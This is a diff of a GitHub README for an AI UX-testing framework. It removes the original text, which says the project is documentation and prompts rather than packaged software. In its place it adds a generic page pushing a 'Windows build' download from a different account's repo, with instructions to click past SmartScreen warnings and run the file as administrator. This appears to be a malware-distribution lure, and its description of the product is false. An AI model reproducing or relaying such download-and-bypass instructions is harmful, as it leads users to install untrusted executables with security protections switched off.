@@ -1,310 +1,212 @@
-# 🧪 Test Pilot Loop
+# 🧪 test-pilot-loop - Test software by using it
 
-### AI that doesn't just write code — it flies the product first.
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/prasunicecold140/test-pilot-loop)
 
-> *A framework where AI agents test software by using it — as different people, with different knowledge, measuring real UX.*
+## 🚀 What this is
 
-**Status: Experimental (v0.1.0) — Seeking real-world validation.**
+test-pilot-loop is an AI tool that checks software by using it like a person would. It helps validate apps before they reach users. It follows a guided loop, so AI agents can open the app, try tasks, catch issues, and report what they find.
 
-> This is a docs-first framework: methodology, templates, and prompt assets — not a packaged software library. Copy the runtime files into your project repo to use the loop. See [What to Copy](#what-to-copy) below.
+This project is made for people who want a hands-off way to test software flows. It can help with:
 
----
+- App checks after a new build
+- UI testing through real user steps
+- Multi-step task testing
+- Basic workflow checks
+- Repeatable test runs
 
-## The Problem
+## 📥 Download
 
-Your code agent writes beautiful code. Tests pass. CI is green. Then a real user opens the app:
+Visit this page to download and run the app on Windows:
 
-> *"I don't know what this button does."*
-> *"Where did my data go?"*
-> *"How do I get back?"*
+[https://github.com/prasunicecold140/test-pilot-loop](https://github.com/prasunicecold140/test-pilot-loop)
 
-Code tests verify that functions return the right values. Nobody verifies that a human can actually use the result.
+Open the page, look for the latest release or setup files, and get the Windows version that fits your system.
 
-**The Test Pilot Loop fixes this.** After code is built, an AI uses the app through computer use — actually tapping, scrolling, typing, navigating — and gives honest human feedback. Not just bugs. Confusion, frustration, and friction.
+## 🪟 Windows setup
 
-**The app isn't done when code passes. It's done when the Test Pilot can use it.**
+1. Open the download page in your browser.
+2. Find the latest release or the main app file.
+3. Download the Windows build.
+4. If your browser asks what to do with the file, choose Save.
+5. When the download finishes, open the file from your Downloads folder.
+6. If Windows shows a security prompt, choose Run or More info, then Run if you trust the source.
+7. Follow the on-screen steps to finish setup.
+8. Start the app from the desktop shortcut or Start menu.
 
----
+## ✅ Before you run it
 
-## How It Works
+Use a Windows PC with:
 
-```
-🛠️ Coding Agent builds feature
-         ↓
-✈️ Cowork (Test Pilot / Orchestrator)
-         ↓
-🧪 3-Tier Test Flight (Cold → Guided → Insider)
-         ↓
-📋 Flight Debrief (Unified + Prioritized)
-         ↓
-🛠️ Coding Agent implements fixes
-         ↓
-🔄 Verification Flight (Cowork retests)
-         ↓
-📈 Gap Check + Pass/Fail Decision
-         ↓
-🚀 Next cycle (if needed) — or ✅ Ship it
-```
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- A stable internet connection
+- Enough free space for the app and its test files
+- A modern browser if the app opens in a web view
 
-**The gap between the Cold user and the Insider is a quantitative measure of your UX quality.** We call it the **Tier Gap Ratio**: Cold user steps ÷ Insider steps. When it's 3x, your app depends on prior knowledge. When it's 1.5x, your app is genuinely intuitive.
+For the best result, close large apps before you run test tasks. This gives the tool more room to work.
 
----
+## 🧭 How it works
 
-## Three Levels of Use
+The app follows a simple loop:
 
-### 🛫 Quick Flight — Zero Setup, 5 Minutes
+1. It opens the software you want to test.
+2. It looks at the screen.
+3. It chooses a task to try.
+4. It uses the app like a real user.
+5. It checks if the task worked.
+6. It logs the result.
+7. It repeats the loop for the next step.
 
-Three Claude models (Opus, Sonnet, Haiku) each test your app independently. Each model's cognitive style naturally creates a different perspective:
+This helps find broken flows, missed buttons, and steps that confuse users.
 
-- **Opus** overthinks — catches design flaws and subtle UX problems
-- **Sonnet** follows the flow — catches what a normal user hits
-- **Haiku** skims — catches what someone who gives up in 10 seconds would miss
+## 🛠️ What you can use it for
 
-No persona files. No configuration. Just three models, three honest reports.
+You can use test-pilot-loop to check many kinds of user flows:
 
-**→ [Start here: QUICK_FLIGHT.md](QUICK_FLIGHT.md)**
+- Sign in and sign out
+- Create, edit, and save items
+- Form fill tests
+- Menu and button checks
+- Page flow checks
+- Error message checks
+- Basic usability checks
+- Multi-agent test runs for larger flows
 
----
+It works best when you want the app to try the same flow many times with clear rules.
 
-### 🧪 Test Pilot Loop — Continuous Build-Test-Fix Cycle
+## 👀 What it can test
 
-Cowork Opus stays open as the brain. After each build, it test-drives the app three times — each time constrained to a different knowledge level. Writes structured feedback to a shared file. Code agent reads it, fixes, signals "ready for retest." Opus retests. Loop until it passes.
+The project is built for software that has a visible screen and user actions. That means it can help with:
 
-**One session. No switching. Continuous feedback loop.**
+- Desktop apps
+- Browser-based tools
+- Internal tools
+- Admin panels
+- Product demos
+- Early-stage builds
 
-> **Canonical mode:** One Cowork Opus orchestrator drives the app through computer use and runs all evaluation passes sequentially. Persona subagent files (in `PERSONAS/`) are an optional helper pattern for code-side evaluation — the orchestrator is the default.
+It is useful when you want to see how a real person would move through the product, not just how the code runs.
 
-- **Personas** model **who** the tester is (expert, everyday, struggling, accessibility)
-- **Knowledge tiers** model **what** the tester knows (nothing, user manual, full PRD)
+## ⚙️ Basic workflow
 
-The combination answers: can THIS person, with THIS much knowledge, use the app?
+A typical run looks like this:
 
-**→ [Main protocol: TEST_PILOT_LOOP.md](TEST_PILOT_LOOP.md)**
+1. You open test-pilot-loop.
+2. You choose the app or page to test.
+3. You set the task or goal.
+4. You start the run.
+5. The AI agent acts on the screen.
+6. You review the output or test log.
+7. You run the next test if needed.
 
----
+Keep each test goal short and clear. For example:
 
-### 🏗️ Flight Deck — Full Framework
+- Open the settings page
+- Change the profile name
+- Save the form
+- Check that the success message appears
 
-When you need maximum rigor: multi-agent orchestration, [Ralph Wiggum](https://github.com/anthropics/claude-code/blob/main/plugins/ralph-wiggum/README.md) build loop integration, kill switch, risk-tiered approval, persona subagents with deep behavioral rules, WCAG accessibility testing, and overnight autonomous operation.
+## 🔒 Safe use tips
 
-| File | What It Is |
-|------|-----------|
-| [FLIGHT_PLAN.md](FLIGHT_DECK/FLIGHT_PLAN.md) | Full orchestration — Cowork brain, agents, risk tiers, kill switch, crash recovery |
-| [PILOT_HANDBOOK.md](FLIGHT_DECK/PILOT_HANDBOOK.md) | Persona-based testing — 4 personas, 6 dimensions, scoring |
-| [FLIGHT_DEBRIEF.md](FLIGHT_DECK/FLIGHT_DEBRIEF.md) | UX findings, bug classification, severity/priority, escalation outcomes |
-| [FLIGHT_LOG.md](FLIGHT_DECK/FLIGHT_LOG.md) | Knowledge-tiered UX testing — 3 tiers, agent-steps, Tier Gap Ratio |
-| [PREFLIGHT_CHECK.md](FLIGHT_DECK/PREFLIGHT_CHECK.md) | Configuration — choose personas, tiers, dimensions, thresholds |
-| [AUTOPILOT.md](FLIGHT_DECK/AUTOPILOT.md) | Claude Code companion — teaches your code agent the protocol |
-| [TEST_FLIGHT_PROTOCOL.md](FLIGHT_DECK/TEST_FLIGHT_PROTOCOL.md) | How the test pilot tests — screen-by-screen execution protocol |
+Use a copy of your app when you can. This helps avoid changes to live data.
 
-**→ [Full framework: FLIGHT_DECK/](FLIGHT_DECK/)**
+Good habits:
 
-### 🔌 Integrations
+- Test in a staging or demo account
+- Use fake data where possible
+- Save logs after each run
+- Check results before you trust them
+- Re-run key flows after each build
 
-OpenClaw integration available — drop `OPENCLAW_SKILL.md` into any OpenClaw agent system to run Test Pilot Loop flights without additional setup.
+## 📁 Files and folders
 
-| File | What It Is |
-|------|-----------|
-| [OPENCLAW_SKILL.md](OPENCLAW_SKILL.md) | OpenClaw skill — self-contained version for OpenClaw agent systems |
+When you download the project, you may see files for setup, runs, logs, or config. Common items can include:
 
----
+- A main app file
+- A config file for test steps
+- A log folder
+- A results folder
+- A README file with setup help
 
-## Getting Started
+If you see a file named like `config`, `settings`, or `run`, open it only if the app asks you to change a setting.
 
-**You don't need to manually copy files or configure anything.** Your AI agents read the framework and set everything up for your project automatically.
+## 🧪 Example test tasks
 
-**→ [Start here: GETTING_STARTED.md](GETTING_STARTED.md)** — two steps, two sentences.
+Here are simple tasks you can try after setup:
 
-**Short version:**
-1. Tell your builder agent (Claude Code / Codex): *"Read `FLIGHT_DECK/SETUP.md` from the Test Pilot Loop framework and set up the test pilot loop for this project."*
-2. Tell your test pilot (Cowork): *"Read `FLIGHT_DECK/SETUP.md` and set up as test pilot. Start testing."*
+- Open the app and check the home page
+- Try a search and confirm results show up
+- Fill in a form and submit it
+- Open the profile page and change one field
+- Click through the main menu
+- Check that a warning appears for bad input
 
-The agents read your project spec, ask you a few questions, generate all config files, set up patrol, and confirm when ready. The loop starts automatically.
+These tasks help the tool learn how your product behaves in real use.
 
-### What the Agents Generate
+## 🖥️ Common Windows steps
 
-| File | Generated By | Purpose |
-|------|-------------|---------|
-| `FLIGHT_DECK/FLIGHT_PLAN.md` | Builder | Shared communication hub (tailored to your project) |
-| `FLIGHT_DECK/INSIDER_GOALS.md` | Builder | Project-specific testing playbook |
-| `.claude/settings.local.json` | Builder | Permissions for autonomous operation |
-| `FLIGHT_DECK/.patrol_state.txt` | Test Pilot | Patrol state persistence (scheduled tasks) |
+If Windows asks for permission:
 
-### Framework Files (Reference)
+- Choose Yes if you trust the file
+- If SmartScreen shows a warning, select More info and then Run
+- If the app does not open, right-click the file and choose Run as administrator
+- If the file came in a ZIP folder, extract it first
 
-These files stay in the framework repo. Your agents read them during setup and reference them during the loop — you don't need to copy them manually:
+If the app still does not start, download it again and try once more.
 
-| File | What It Is |
-|------|-----------|
-| `FLIGHT_DECK/SETUP.md` | **The entry point.** Both agents read this to self-configure. |
-| `FLIGHT_DECK/AUTOPILOT.md` | Builder agent rules of engagement |
-| `FLIGHT_DECK/PILOT_HANDBOOK.md` | Testing personas and knowledge tiers |
-| `FLIGHT_DECK/FLIGHT_DEBRIEF.md` | Bug reporting format |
-| `FLIGHT_DECK/TEST_FLIGHT_PROTOCOL.md` | Screen-by-screen testing protocol |
-| `FLIGHT_DECK/PREFLIGHT_CHECK.md` | Testing depth configuration |
-| `FLIGHT_DECK/FLIGHT_LOG.md` | Cross-run metrics and Tier Gap tracking |
-| `test-pilot-patrol-prompt.md` | Scheduled task patrol prompt (read by Cowork, not manually copied) |
-| `PERSONAS/agents/*.md` | Persona subagent files |
+## 📌 Project focus
 
----
+test-pilot-loop focuses on guided AI testing with real user actions. It combines:
 
-## Persona Subagents
+- AI orchestration
+- Computer use
+- Test automation
+- UX testing
+- Persona-based testing
+- Multi-agent coordination
+- Loop-based validation
 
-Ready-to-use Claude Code subagent files. Drop into `.claude/agents/` and spawn them by name.
+That makes it fit for teams that need repeatable checks for product flows.
 
-**Core 4 Personas:**
+## 🧩 Good first run
 
-| File | Persona | Tests For |
-|------|---------|-----------|
-| [test-pilot-alex.md](PERSONAS/agents/test-pilot-alex.md) | 🟢 Power User | Shortcuts, batch ops, efficiency |
-| [test-pilot-jordan.md](PERSONAS/agents/test-pilot-jordan.md) | 🟡 Everyday User | Confusing labels, broken happy path |
-| [test-pilot-pat.md](PERSONAS/agents/test-pilot-pat.md) | 🔴 Struggling User | Cognitive overload, scary jargon |
-| [test-pilot-sam.md](PERSONAS/agents/test-pilot-sam.md) | ♿ Accessibility User | WCAG compliance, keyboard traps |
+For your first test, keep it simple:
 
-**Knowledge Tiers:**
+- Pick one page
+- Pick one task
+- Watch the result
+- Check the log
+- Fix the issue
+- Run it again
 
-| File | Tier | Knowledge |
-|------|------|-----------|
-| [test-pilot-tier1-cold.md](PERSONAS/agents/test-pilot-tier1-cold.md) | Cold | Knows nothing |
-| [test-pilot-tier2-guided.md](PERSONAS/agents/test-pilot-tier2-guided.md) | Guided | Has user manual |
-| [test-pilot-tier3-insider.md](PERSONAS/agents/test-pilot-tier3-insider.md) | Insider | Has full PRD |
+This helps you see how the tool behaves before you use it on a full product.
 
-**Archetype Overlays:** [Creator / Admin / Consumer](PERSONAS/archetypes/archetype-overlays.md) — layer on top of any persona based on what feature is being tested.
+## 🧰 If something seems off
 
-**→ [Persona docs: PERSONAS/](PERSONAS/)**
+Try these steps:
 
----
+- Make sure you downloaded the latest version
+- Check that Windows did not block the file
+- Close other apps
+- Reopen the app
+- Try a simpler test task
+- Confirm your internet connection is stable
+- Check the log for the last step that ran
 
-## Requirements
+## 📎 Download link
 
-This framework requires **Claude with computer use capability:**
+[Visit the GitHub page to download test-pilot-loop](https://github.com/prasunicecold140/test-pilot-loop)
 
-- **Cowork (Claude Desktop app)** with computer use enabled — for the Test Pilot to see and interact with your app
-- **Claude Code** — for building features and running subagents
-- **A running instance of your app** visible on screen:
+## 🔎 Topics covered
 
-| Project Type | How to Launch for Testing |
-|---|---|
-| macOS app | Build and run in Xcode — app window visible on desktop |
-| iOS app | Run in Xcode Simulator — simulator window visible on screen |
-| Web app | Start dev server, open `localhost` in browser |
-| Website | Open the URL in Safari or Chrome |
-| Android app | Run in Android Studio emulator |
-| CLI tool | Open Terminal, ready for commands |
-
-**Key:** The app must be on the **same Mac** where Cowork is running and **visible on screen** (not minimized). Cowork interacts with what it can see.
-
-> **Architecture note:** In this reference implementation, Cowork does not directly operate coding-agent terminals. Coordination happens through `FLIGHT_PLAN.md`, with the coding agent responsible for polling the file, acting on instructions, and reporting back. See [The Dual-Patrol Model](TEST_PILOT_LOOP.md#the-dual-patrol-model) for details.
-
-The Test Pilot Loop is not a fully automated plug-and-play system (yet). It's a governed framework that requires a human director to launch the app, set up sessions, and make final calls. The AI handles the testing; you handle the setup.
-
-> **Note:** The methodology is agent-agnostic. This repo is a reference implementation using Claude Code + Cowork. The concepts (persona-based testing, knowledge tiers, structured feedback loops) can be adapted to other AI agents with computer use capabilities.
-
----
-
-## The Adoption Path
-
-```
-🛫 Quick Flight          "Let me try this in 5 minutes"
-         ↓                     
-🧪 Test Pilot Loop       "This works. I want continuous testing."
-         ↓                     
-📋 Personas               "I want deeper behavioral testing."
-         ↓                     
-🏗️ Flight Deck            "I need full governance for my team."
-```
-
-Start wherever makes sense for your project. Each layer is compatible with the ones above and below it.
-
----
-
-## Repository Structure
-
-```
-test-pilot-loop/
-├── README.md                              ← You are here
-├── QUICK_FLIGHT.md                        ← 🛫 Zero-setup 3-model test
-├── TEST_PILOT_LOOP.md                     ← 🧪 Core protocol (continuous loop)
-├── CLAUDE.md                              ← Loader for Claude Code (imports AUTOPILOT.md)
-├── FLIGHT_DECK/                           ← 🏗️ Full framework
-│   ├── FLIGHT_PLAN.md                     ← Multi-agent orchestration + escalation rules
-│   ├── PILOT_HANDBOOK.md                  ← Test personas, scoring, evaluation dimensions
-│   ├── FLIGHT_DEBRIEF.md                  ← UX findings, bugs, escalation outcomes
-│   ├── FLIGHT_LOG.md                      ← Cross-run metrics + Tier Gap tracking
-│   ├── PREFLIGHT_CHECK.md                 ← Test configuration + run setup
-│   ├── AUTOPILOT.md                          ← Claude Code operating instructions
-│   └── TEST_FLIGHT_PROTOCOL.md               ← Screen-by-screen execution protocol
-├── PERSONAS/                              ← 📋 Persona subagent files
-│   ├── README.md                          ← Install guide + usage
-│   ├── agents/                            ← Drop into .claude/agents/
-│   │   ├── test-pilot-alex.md             ← 🟢 Power User
-│   │   ├── test-pilot-jordan.md           ← 🟡 Everyday User
-│   │   ├── test-pilot-pat.md              ← 🔴 Struggling User
-│   │   ├── test-pilot-sam.md              ← ♿ Accessibility User
-│   │   ├── test-pilot-tier1-cold.md       ← Tier 1 (knows nothing)
-│   │   ├── test-pilot-tier2-guided.md     ← Tier 2 (has manual)
-│   │   └── test-pilot-tier3-insider.md    ← Tier 3 (has PRD)
-│   └── archetypes/
-│       └── archetype-overlays.md          ← Creator / Admin / Consumer
-├── OPENCLAW_SKILL.md                      ← OpenClaw skill version
-├── CITATION.cff                           ← Citation metadata
-└── LICENSE                                ← MIT
-```
-
----
-
-## What Makes This Different
-
-| What exists today | What Test Pilot Loop adds |
-|---|---|
-| Unit tests check code correctness | **Test Pilot checks if a human can use it** |
-| Linters check style | **Test Pilot checks if labels make sense** |
-| CI validates that code compiles | **Test Pilot validates that users can succeed** |
-| Code review checks implementation | **Test Pilot checks experience** |
-| QA testers know the product | **Cold User knows nothing — tests real discoverability** |
-
-This repo combines: live app testing through computer use + persona-based behavioral evaluation + knowledge-tiered UX measurement + structured feedback loops back to the coding agent.
-
----
-
-## Origin
-
-This framework was created by a developer who got tired of shipping features that passed every test but confused every user.
-
-The core insight: **the person who builds the software is the worst person to test it.** They know too much. They can't see what's confusing because nothing confuses them.
-
-So we built an AI test pilot that operates under a constrained context — no prior knowledge of the product, no insider assumptions — and evaluates the app through computer use the way a new user would encounter it.
-
----
-
-## Safety and Privacy
-
-This framework uses **computer use** — the AI can see your screen, click, and type. Keep these guidelines in mind:
-
-- **Use synthetic or test data** when running test pilots. Don't expose real user data, credentials, or PII to the testing environment.
-- **Run in a non-production environment.** Use simulators, dev servers, or staging builds — not production systems with live data.
-- **Cowork is a research preview** (macOS only as of March 2026). Anthropic recommends dedicated low-privilege environments for computer use, human confirmation for consequential actions, and avoiding sensitive data on screen during sessions.
-- **Review screenshots.** Test pilot sessions capture screenshots in `AUDIT_SCREENSHOTS/`. Review these before sharing or committing to ensure no sensitive data was captured.
-
----
-
-## Contributing
-
-This is experimental. We're looking for:
-
-- **Real test reports** — run the framework, share your results
-- **Domain persona packs** — healthcare, fintech, education, gaming
-- **Archetype expansions** — new archetypes beyond Creator/Admin/Consumer
-- **Integration guides** — how to use this with Cursor, Windsurf, and other coding agents
-- **Bug reports** — inconsistencies, broken cross-references, unclear instructions
-
----
-
-## License
-
-MIT — use it, fork it, improve it, ship better software.
-
----
-
-*Built with Claude Code, Cowork, and too many Xcode simulator crashes.*
-*Test Pilot Loop by Huan Su · 2026*
+- ai-orchestration
+- ai-testing
+- claude-code
+- cli-anything
+- computer-use
+- cowork
+- multi-agent
+- openclaw
+- persona-testing
+- test-automation
+- ux-testing
